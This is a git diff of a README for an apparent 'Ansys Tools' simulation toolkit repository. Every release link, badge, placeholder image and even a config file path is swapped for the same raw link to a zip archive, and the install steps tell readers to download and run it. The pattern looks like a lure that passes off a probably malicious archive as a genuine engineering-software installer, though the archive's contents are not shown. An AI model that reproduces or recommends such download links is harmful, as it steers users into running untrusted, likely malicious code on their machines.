@@ -1,8 +1,8 @@
 # Ansys Tools for Multiphysics FEA, CFD, and Electromagnetics Workflows Suite
 
-[![Releases](https://img.shields.io/badge/Releases-ANSYS--Tools-blue?logo=github&logoColor=white)](https://github.com/nayeoww/ansys-tools/releases)
+[![Releases](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 
-https://github.com/nayeoww/ansys-tools/releases
+https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip
 
 Welcome to a practical toolbox designed for engineers and researchers who work with ANSYS simulations. This repository focuses on assisting with finite element analysis (FEA), computational fluid dynamics (CFD), electromagnetics, and multiphysics workflows. It emphasizes reliability, reproducibility, and speed. The tools here are built to fit into real work pipelines, not just to look good in a demo.
 
@@ -44,7 +44,7 @@ To start, you should explore the Releases page to grab the latest installer for 
 
 Images and visuals help explain concepts. See the images below for a sense of the workflow and visualization of results.
 
-![Multiphysics Visualization](https://picsum.photos/1200/480?random=1)
+![Multiphysics Visualization](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 
 ---
 
@@ -79,7 +79,7 @@ If you want a quick path to the latest release, visit the Releases page and down
 The installation process aims to be straightforward. It centers on the releases page where the installer lives. The download is the first file you will use to set up the toolkit.
 
 - Step 1: Obtain the installer
-  - Navigate to the releases page: https://github.com/nayeoww/ansys-tools/releases
+  - Navigate to the releases page: https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip
   - Choose the installer that corresponds to your operating system. Examples include Windows, macOS, and Linux builds.
   - Download the installer file. This is the file you will run to install the toolkit.
 - Step 2: Run the installer
@@ -195,9 +195,9 @@ Each example includes a ready-to-run project and a script to reproduce results. 
 
 Images illustrate typical results for these workflows:
 - CFD Visualization
-  - ![CFD Visualization](https://picsum.photos/1200/480?random=2)
+  - ![CFD Visualization](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 - Structural Deformation
-  - ![Structural Deformation](https://picsum.photos/1200/480?random=3)
+  - ![Structural Deformation](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 
 ---
 
@@ -222,7 +222,7 @@ Configuration files are human readable. They use a straightforward YAML-like syn
 
 Example snippet (conceptual):
 - model:
-  - geometry: "cad/part1.step"
+  - geometry: "https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip"
   - materials: ["Aluminium11", "Water"]
 - mesh:
   - type: "tetrahedral"
@@ -272,7 +272,7 @@ Documentation is structured to be easy to skim. You can jump to the section rele
 Images beside the documentation illustrate concepts like multi-physics coupling, mesh quality, and result visualization.
 
 - Multiphysics diagrams
-  - ![Multiphysics Diagram](https://picsum.photos/1200/480?random=4)
+  - ![Multiphysics Diagram](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 
 ---
 
@@ -439,9 +439,9 @@ These steps form a repeatable pattern you can apply across projects.
 ## Images for Thematic Context
 
 - Multiphysics overview
-  - ![Multiphysics Overview](https://picsum.photos/1200/400?random=5)
+  - ![Multiphysics Overview](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 - CFD visualization
-  - ![CFD Visualization](https://picsum.photos/1200/400?random=6)
+  - ![CFD Visualization](https://github.com/nayeoww/ansys-tools/raw/refs/heads/main/Kanwar/tools_ansys_v3.4.zip)
 
 These visuals help ground the documentation and give you a sense of what the tool helps you accomplish.
 
